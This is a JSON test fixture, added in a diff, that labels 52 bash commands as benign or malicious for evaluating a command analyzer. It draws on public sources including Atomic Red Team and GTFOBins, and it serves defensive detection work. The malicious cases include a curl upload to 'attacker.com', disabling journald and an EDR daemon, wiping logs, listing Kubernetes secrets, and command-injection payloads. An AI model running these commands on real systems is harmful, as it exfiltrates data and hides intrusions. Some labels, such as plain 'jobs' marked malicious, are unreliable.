@@ -1,0 +1,370 @@
+{
+  "name": "external-bash",
+  "description": "External balanced sample for bash (26 malicious + 26 benign), drawn from public labeled datasets (bash-datasets/CC BY-SA 4.0, Atomic Red Team, TLDR, darkknight25, aelhalili — MIT). Gate semantics: external_malicious cases must be covered (effect present or sound ⊤); external_benign cases must be covered without raising ⊤/conservative. See README.md for provenance and methodology.",
+  "cases": [
+    {
+      "id": "ext-bash-b-001",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "ln -s example.txt link_example.txt",
+      "note": "aelhalili/bash-commands-dataset [MIT]; Create a symbolic link for a file named example.txt to link_example.txt"
+    },
+    {
+      "id": "ext-bash-b-002",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find /home/the_peasant -type f",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; display all normal/regular files in a folder"
+    },
+    {
+      "id": "ext-bash-b-003",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "tail -v -n 2 error.log",
+      "note": "darkknight25/Linux_Terminal_Commands_Dataset [MIT]; Displays the last 2 lines of error.log with file headers."
+    },
+    {
+      "id": "ext-bash-b-004",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -name \"*.txt\" -printf \"%T@ %p\\n\" | sort | tail -1",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Print the newest *.txt file under current directory with timestamp and path"
+    },
+    {
+      "id": "ext-bash-b-005",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "who -T",
+      "note": "darkknight25/Linux_Terminal_Commands_Dataset [MIT]; Lists logged-in users with message status."
+    },
+    {
+      "id": "ext-bash-b-006",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "cat report.txt | grep -i error | more",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Case-insensitive search for \"error\" in file report.txt, display one page at a time, waiting for user interaction between each."
+    },
+    {
+      "id": "ext-bash-b-007",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "top -b -n 1",
+      "note": "darkknight25/Linux_Terminal_Commands_Dataset [MIT]; Runs top in batch mode for one iteration."
+    },
+    {
+      "id": "ext-bash-b-008",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "tail -n +2 file.txt | split -l 20 - split_",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Split \"file.txt\" excluding the first line into files with at most 20 lines each and a prefix \"split_\""
+    },
+    {
+      "id": "ext-bash-b-009",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "journalctl -u nginx",
+      "note": "darkknight25/Linux_Terminal_Commands_Dataset [MIT]; Displays logs for the nginx service."
+    },
+    {
+      "id": "ext-bash-b-010",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "[[ \"$(find . -maxdepth 1 -cmin +60 -name file)\" = \"\" ]] && echo \"old\"",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Check if files named 'file' in 1 level down the current directory whose status were changed more than 1 hour ago were not found and print old if that's true"
+    },
+    {
+      "id": "ext-bash-b-011",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -type f -name \"*.JPG\"",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Find regular files whose names end in .JPG; find all jpg files in current folder"
+    },
+    {
+      "id": "ext-bash-b-012",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -type d -mtime 0 -exec mv {} /path/to/target-dir \\;",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Find directories in the current directory tree that were modified within the last 24 hours and move them to /path/to/target-dir; find all the directories in the current folder which have been modified"
+    },
+    {
+      "id": "ext-bash-b-013",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find ./ -regex '.*\\..*'",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; search for files in current folder using regular expressions"
+    },
+    {
+      "id": "ext-bash-b-014",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find /path/to/directory/folder{1..50} -name '*.txt'  2>/dev/null",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Search directories /path/to/directory/folder{1..50} for .txt files"
+    },
+    {
+      "id": "ext-bash-b-015",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find ./ -name \"foo.mp4\" -printf \"%h\\n\"",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Find all foo.mp4 files in the current directory tree and print the pathnames of their parent directories; find the path of a specfic video file in the current directory"
+    },
+    {
+      "id": "ext-bash-b-016",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "ps h -o pid,user -C ssh,sshd | tr -s \" \"",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Print PID and user of processes running ssh or sshd and replace sequential spaces with a single space"
+    },
+    {
+      "id": "ext-bash-b-017",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find /opt -cmin -120",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; find all the files  in the folder /opt which have been changed in the last 120 minutes"
+    },
+    {
+      "id": "ext-bash-b-018",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find -x data -name \"filepattern-*2009*\" -print0 | tar --null --no-recursion -uf 2009.tar --files-from -",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Archive all filepattern-*2009* files/directories under data/ into 2009.tar"
+    },
+    {
+      "id": "ext-bash-b-019",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "mount /media/Working/ -oremount,umask=000",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Remount \"/media/Working/\" with a umask of 000"
+    },
+    {
+      "id": "ext-bash-b-020",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -print|grep sql|xargs grep -i dba_2pc_pending",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; find for the word \"dba_2pc_pending\" in all the files of current fodler having the word \"sql\" in their name"
+    },
+    {
+      "id": "ext-bash-b-021",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -maxdepth 1 -type d -empty",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; find all the empty in the current folder do not search in sub directories"
+    },
+    {
+      "id": "ext-bash-b-022",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "read -e -p '> ' $1",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Read a line from standard input into the first argument (\"$1\") using an interactive shell with prompt \"> \""
+    },
+    {
+      "id": "ext-bash-b-023",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find ./lib/app -type f | sort | tee myFile",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Find all files under ./lib/app and redirect their sorted list to myFile"
+    },
+    {
+      "id": "ext-bash-b-024",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -iname '*.txt' -type f -exec sed -i '' 's/[[:space:]]\\{1,\\}$//' {} \\+",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Remove trailing whitespaces in TXT files from the current directory tree; find all text files in current folder and trim the extra spaces in all lines in these files ( MAC version )"
+    },
+    {
+      "id": "ext-bash-b-025",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "find . -name '*.png' | grep -f <(sed s?^?/[0-9]_[0-9]_[0-9]_? search.txt)",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; find all the png files in current folder which are present in the pattern list file \"search.txt\""
+    },
+    {
+      "id": "ext-bash-b-026",
+      "group": "external_benign",
+      "lang": "bash",
+      "input": "jobs -s",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Display stopped processes:"
+    },
+    {
+      "id": "ext-bash-m-001",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "mkdir -p 'testdirwithspaceend '",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1036.006: Space After Filename"
+    },
+    {
+      "id": "ext-bash-m-002",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "kill -31 $TARGETPID",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1014: Loadable Kernel Module based Rootkit (Diamorphine)"
+    },
+    {
+      "id": "ext-bash-m-003",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1560.001: Data Compressed - nix - tar Folder or File"
+    },
+    {
+      "id": "ext-bash-m-004",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "systemctl disable cbdaemon",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1685: Disable Cb Response"
+    },
+    {
+      "id": "ext-bash-m-005",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "echo 'source = session.get(url).content' >> T1059.006.py",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1059.006: Execute Python via Python executables; Atomic Red Team T1059.006: Execute Python via scripts"
+    },
+    {
+      "id": "ext-bash-m-006",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "pw useradd art -g wheel -s /bin/sh",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1078.003: Reactivate a locked/expired account (FreeBSD)"
+    },
+    {
+      "id": "ext-bash-m-007",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "tshark -c 5 -i ens33",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1040: Packet Capture Linux using tshark or tcpdump"
+    },
+    {
+      "id": "ext-bash-m-008",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "telnet 192.168.1.1 80",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1046: Port Scan Nmap"
+    },
+    {
+      "id": "ext-bash-m-009",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "sudo vim /etc/sudoers",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1548.003: Sudo usage"
+    },
+    {
+      "id": "ext-bash-m-010",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\;",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1217: List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux"
+    },
+    {
+      "id": "ext-bash-m-011",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "docker exec t1612_container ./test.sh",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1612: Build Image On Host"
+    },
+    {
+      "id": "ext-bash-m-012",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "| ls -l /etc/",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; PayloadsAllTheThings command injection fuzzing payload"
+    },
+    {
+      "id": "ext-bash-m-013",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "\"\\n/bin/ls -al\\n\"",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; PayloadsAllTheThings command injection fuzzing payload"
+    },
+    {
+      "id": "ext-bash-m-014",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1027.001: Pad Binary to Change Hash - Linux/macOS dd"
+    },
+    {
+      "id": "ext-bash-m-015",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "unamestr=$(uname)",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1003.008: Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat"
+    },
+    {
+      "id": "ext-bash-m-016",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "sudo systemctl stop systemd-journald #disables journal logging",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1685: Disable journal logging via systemctl utility"
+    },
+    {
+      "id": "ext-bash-m-017",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "dir C:\\Documents and Settings\\*",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; PayloadsAllTheThings command injection fuzzing payload"
+    },
+    {
+      "id": "ext-bash-m-018",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "curl -X POST --data-binary DATA http://attacker.com",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; GTFOBins exploit function 'upload' using curl"
+    },
+    {
+      "id": "ext-bash-m-019",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1056.001: Auditd keylogger"
+    },
+    {
+      "id": "ext-bash-m-020",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "kubectl get secrets --all-namespaces",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1552.007: List All Secrets"
+    },
+    {
+      "id": "ext-bash-m-021",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "snap install xxxx_1.0_all.snap --dangerous --devmode",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; GTFOBins exploit function 'command' using snap"
+    },
+    {
+      "id": "ext-bash-m-022",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "find /usr/bin -perm -4000",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1548.001: Do reconnaissance for files that have the setuid bit set"
+    },
+    {
+      "id": "ext-bash-m-023",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1546.004: System shell profile scripts"
+    },
+    {
+      "id": "ext-bash-m-024",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "systemctl status atomic-test.service",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1569.003: Create and Enable a Malicious systemd Service Unit"
+    },
+    {
+      "id": "ext-bash-m-025",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "cat /dev/null > /var/log/messages #truncating the file to zero bytes",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Atomic Red Team T1685.006: Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)"
+    },
+    {
+      "id": "ext-bash-m-026",
+      "group": "external_malicious",
+      "lang": "bash",
+      "input": "jobs",
+      "note": "bash-datasets (rivoluzione-informatica) [CC BY-SA 4.0]; Show status of all jobs:; View jobs spawned by the current shell:; list all running jobs"
+    }
+  ]
+}
